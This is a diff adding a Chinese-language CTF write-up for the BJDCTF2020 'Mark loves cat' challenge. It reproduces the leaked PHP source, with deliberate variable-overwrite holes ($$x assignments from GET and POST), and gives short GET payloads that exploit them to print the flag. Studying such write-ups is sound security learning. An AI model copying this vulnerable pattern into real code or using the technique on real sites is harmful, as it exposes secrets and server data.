@@ -34,7 +34,61 @@ http://ec1c5bb6-221c-4577-8d10-0bc84cb670d0.node3.buuoj.cn/levels91.php?a[]=1&b[
 param1[]=1&param2[]=2
 ```
 
+## [BJDCTF2020]Mark loves cat
 
+首先查看网页源代码在网页最下方发现了dog，尝试以get请求拼接，无果，额只能目录扫描看看有啥可利用的了
+
+发现.git源码泄露，使用GitHack获取关键源码
+
+```
+<?php
+
+include 'flag.php';
+
+$yds = "dog";
+$is = "cat";
+$handsome = 'yds';
+//变量覆盖
+foreach($_POST as $x => $y){
+    $$x = $y;
+}
+//变量覆盖
+foreach($_GET as $x => $y){
+    $$x = $$y;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){ //如果GET传入的参数当中没有flag则进入循环
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+
+
+
+echo "the flag is: ".$flag;
+```
+
+payload1：
+
+```
+flag2=11&yds=flag
+```
+
+payload2：和上面是等价的
+
+```
+yds=flag
+```
+
+在页面最下方获取到flag
 
 # 仓库地址
 
